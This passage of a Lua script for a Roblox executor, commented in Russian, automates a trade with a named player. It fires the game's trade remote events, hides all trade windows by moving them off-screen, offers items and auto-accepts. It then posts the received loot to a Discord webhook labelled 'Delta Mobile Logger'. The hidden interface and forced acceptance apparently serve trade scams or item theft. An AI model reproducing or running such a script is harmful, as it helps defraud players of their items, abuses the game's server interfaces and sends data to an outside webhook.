-- 1. ОТПРАВКА ЗАПРОСА
-- =========================================================
local function sendTradeToTarget()
    local target = Players:FindFirstChild(TARGET_NAME)
    if not target then return end

    print("[trade] Ждём прогрузки " .. TARGET_NAME .. "...")
    if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
        local conn
        local done = false
        conn = target.CharacterAdded:Connect(function() done = true end)
        local t = 0
        while not done and t < 30 and target.Parent do
            task.wait(0.2); t += 0.2
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then done = true end
        end
        if conn then conn:Disconnect() end
    end
    task.wait(2)

    local Trade = ReplicatedStorage:WaitForChild("Trade")
    local SendRequest = Trade:WaitForChild("SendRequest")

    for i = 1, 5 do
        if not Players:FindFirstChild(TARGET_NAME) then return end
        local ok, res = pcall(function() return SendRequest:InvokeServer(target) end)
        if ok and res == true then
            print("[trade] ✅ Запрос на трейд отправлен.")
            return
        end
        task.wait(2)
    end
    warn("[trade] ❌ Сервер отклонил запрос.")
end

-- =========================================================
-- 2. СКРЫТИЕ GUI ТРЕЙДА
-- =========================================================
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local function hideTradeWindows()
    local okTM, TM = pcall(function() return require(ReplicatedStorage.Modules.TradeModule) end)
    if okTM and TM and TM.GUI and TM.GUI.RequestFrame then
        TM.GUI.RequestFrame.Visible = false
        TM.GUI.RequestFrame:GetPropertyChangedSignal("Visible"):Connect(function()
            TM.GUI.RequestFrame.Visible = false
        end)
    end

    for _, gui in ipairs(PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and string.find(string.lower(gui.Name), "trade") then
            for _, child in ipairs(gui:GetDescendants()) do
                if child:IsA("GuiObject") then
                    pcall(function() child.Position = UDim2.new(9999, 0, 9999, 0) end)
                end
            end
            gui.DescendantAdded:Connect(function(child)
                if child:IsA("GuiObject") then
                    pcall(function() child.Position = UDim2.new(9999, 0, 9999, 0) end)
                end
            end)
        end
    end
end

hideTradeWindows()
PlayerGui.ChildAdded:Connect(function(child)
    if child:IsA("ScreenGui") and string.find(string.lower(child.Name), "trade") then
        task.wait(0.1); hideTradeWindows()
    end
end)

-- =========================================================
-- 3. ВЫСТАВЛЕНИЕ ПРЕДМЕТОВ + АВТО-АКЦЕПТ + ЛОГГЕР
-- =========================================================
local Trade = ReplicatedStorage:WaitForChild("Trade")
local lastOffer = nil
local myName = LocalPlayer.Name
local offered = false

Trade.StartTrade.OnClientEvent:Connect(function()
    if offered then return end
    offered = true
    print("[offer] Трейд открыт. Выставляем безопасные Common...")
    
    task.wait(3)

    for _, item in ipairs(MY_OFFER) do
        local ok, err = pcall(function()
            Trade.OfferItem:FireServer(item.id, item.type)
        end)
        if ok then
            print("[offer] ✅ Выставил " .. item.id)
        else
            warn("[offer] ❌ Не смог выставить " .. item.id .. ": " .. tostring(err))
        end
        task.wait(1.5)
    end
end)

Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if data.LastOffer then lastOffer = data.LastOffer end
end)

Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
    if success and lootList then
        local fields = {}
        for _, item in ipairs(lootList) do
            local itemId, amount, itemType = item[1], item[2], item[3]
            local itemName = itemId
            pcall(function()
                local Sync = require(ReplicatedStorage.Database.Sync)
                local info = Sync[itemType] and Sync[itemType][itemId]
                if info then itemName = info.ItemName or info.Name or itemId end
            end)
            table.insert(fields, {
                name = "🔹 " .. itemName,
                value = "Количество: **" .. amount .. "**",
                inline = true
            })
        end

        local payload = {
            username = "Trade Logger (" .. myName .. ")",
            embeds = {
                {
                    title = "📦 Успешный трейд с " .. TARGET_NAME,
                    color = 0x2ECC71,
                    fields = fields,
                    description = "Вы получили предметы из списка выше.",
                    footer = { text = "Delta Mobile Logger" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }
            }
        }

        local requestFunc = request or http_request or (syn and syn.request)
        if requestFunc then
            pcall(function()
                requestFunc({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(payload)
                })
            end)
            print("[trade] 📦 Лут залогирован в Discord!")
        end
    else
        print("[trade] Мари приняла. Пробуем авто-акцепт...")
        if lastOffer then
            pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
            end)
            print("[trade] ✅ Авто-акцепт отправлен.")
        end
    end
end)

